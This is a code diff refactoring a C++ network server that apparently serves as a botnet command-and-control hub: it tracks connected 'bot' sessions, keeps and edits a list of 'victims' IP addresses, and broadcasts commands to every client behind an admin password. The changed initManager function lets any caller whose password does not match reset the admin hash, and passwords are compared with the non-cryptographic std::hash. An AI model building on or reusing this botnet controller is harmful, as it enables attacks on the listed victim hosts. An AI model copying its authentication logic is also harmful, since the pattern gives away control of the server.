@@ -1,9 +1,5 @@
 #include "server.h"
 
-#include <memory>
-#include <sstream>
-#include <vector>
-
 #ifdef NDEBUG
 #define PRINT(a, b)
 #else
@@ -42,12 +38,12 @@ void server::accept() {
 }
 
 void server::onAccept(err error_code) {
-	int client_id = generateId();
+	size_t client_id = getClientId_();
 	clients_sessions_container_.insert(
 	    std::make_pair(client_id, std::make_shared<session>(std::move(*socket_), io_context_, client_id)));
 	auto& client = clients_sessions_container_.find(client_id)->second;
 
-	client->send("#: Connected succesfully\n");
+	// client->send("SUCCESS\n");
 	PRINT("New client connected", "");
 
 	client->start(boost::bind(&server::handleResponse, this, boost::placeholders::_1, boost::placeholders::_2));
@@ -55,7 +51,7 @@ void server::onAccept(err error_code) {
 }
 
 void server::handleResponse(std::string& query, session* client) {
-	std::cout << client->endpoint_ << " Incoming query: " << query << std::endl;
+	PRINT(client->endpoint_, (": " + query));
 
 	auto parsed_msg = msg_parser_.parse_msg(query);
 
@@ -72,33 +68,28 @@ void server::handleResponse(std::string& query, session* client) {
 	if (handler) handler(parsed_msg["command"][0], parsed_msg["params"], client);
 }
 
-bool isNumber(const std::string& s) { return !s.empty() && std::all_of(s.begin(), s.end(), ::isdigit); }
-
 void server::handleAlive(std::string& command, std::vector<std::string>& params, session* client) {
 	if (!params.size()) return;
-	if (!isNumber(params[0])) return;
+	if (!isNumber_(params[0])) return;
 	if (stoi(params[0])) client->inactive_timeout_count_ = 0;
 }
 
 void server::initManager(std::string& command, std::vector<std::string>& params, session* client) {
-	if (admin_hash_) return;
-	if (!params.size()) return;
-	std::hash<std::string> hasher;
-	admin_hash_ = hasher(params[0]);
-	PRINT("Initialized manager, succesfully", "");
+	if (params.size()) {
+		if (!checkHash_(params[0])) {
+			PRINT(command, " Success.");
+			std::hash<std::string> hasher;
+			admin_hash_ = hasher(params[0]);
+		}
+	}
+
 	std::vector<std::string> output_params = {"1"};
 	client->send(msg_parser_.genCommand(command, output_params));
 }
 
-bool server::checkHash(std::string& pass) {
-	if (pass == "") return false;
-	std::hash<std::string> hasher;
-	return hasher(pass) == admin_hash_;
-}
-
 void server::getClients(std::string& command, std::vector<std::string>& params, session* client) {
 	if (!params.size()) return;
-	if (!checkHash(params[0])) return;
+	if (!checkHash_(params[0])) return;
 
 	std::vector<std::string> output_params;
 	{
@@ -114,7 +105,7 @@ void server::getClients(std::string& command, std::vector<std::string>& params, 
 
 void server::getVictims(std::string& command, std::vector<std::string>& params, session* client) {
 	if (!params.size()) return;
-	if (!checkHash(params[0])) return;
+	if (!checkHash_(params[0])) return;
 
 	std::vector<std::string> output_params;
 	{
@@ -128,16 +119,16 @@ void server::getVictims(std::string& command, std::vector<std::string>& params, 
 
 void server::addVictim(std::string& command, std::vector<std::string>& params, session* client) {
 	if (params.size() < 2) return;
-	if (!checkHash(params[0])) return;
+	if (!checkHash_(params[0])) return;
 	std::unique_lock<std::mutex> lock(victims_m_);
 	victims_ips_.push_back(params[1]);
 }
 
 void server::removeClient(std::string& command, std::vector<std::string>& params, session* client) {
 	if (params.size() < 2) return;
-	if (!checkHash(params[0])) return;
+	if (!checkHash_(params[0])) return;
 	std::shared_ptr<session> bot;
-	long int bot_id;
+	size_t bot_id;
 	{
 		std::unique_lock<std::mutex> lock(clients_m_);	// TODO: create second hash map with ip addresses
 		for (auto const& [key, val] : clients_sessions_container_) {
@@ -159,7 +150,7 @@ void server::removeClient(std::string& command, std::vector<std::string>& params
 
 void server::removeVictim(std::string& command, std::vector<std::string>& params, session* client) {
 	if (params.size() < 2) return;
-	if (!checkHash(params[0])) return;
+	if (!checkHash_(params[0])) return;
 
 	std::unique_lock<std::mutex> lock(victims_m_);
 	auto index = find(victims_ips_.begin(), victims_ips_.end(), params[1]);
@@ -171,7 +162,7 @@ void server::pingClients() {
 	while (true) {
 		usleep(INACTIVITY_TIMEOUT);
 
-		std::vector<long int> inactive_clients;
+		std::vector<size_t> inactive_clients;
 
 		for (auto& client : clients_sessions_container_) {
 			client.second->inactive_timeout_count_++;
@@ -189,6 +180,7 @@ void server::pingClients() {
 		{
 			std::unique_lock<std::mutex> lock(clients_m_);
 			for (auto& client_id : inactive_clients) {
+				PRINT("ERASING ", client_id);
 				clients_sessions_container_.erase(client_id);
 			}
 		}
@@ -201,11 +193,18 @@ void server::sendAllClients(std::string const& msg) {
 	}
 }
 
-long int server::generateId() {
-	clients_m_.lock();
-	long int id =
-	    clients_sessions_container_.size() +
-	    std::chrono::duration_cast<std::chrono::milliseconds>(std::chrono::system_clock::now().time_since_epoch()).count();
-	clients_m_.unlock();
+size_t server::getClientId_() {
+	std::hash<long int> hasher;
+	size_t id = hasher(
+	    std::chrono::duration_cast<std::chrono::milliseconds>(std::chrono::system_clock::now().time_since_epoch()).count());
+	PRINT("Created hash", id);
 	return id;
 }
+
+bool server::checkHash_(std::string& pass) {
+	if (pass == "") return false;
+	std::hash<std::string> hasher;
+	return hasher(pass) == admin_hash_;
+}
+
+bool server::isNumber_(const std::string& s) { return !s.empty() && std::all_of(s.begin(), s.end(), ::isdigit); }
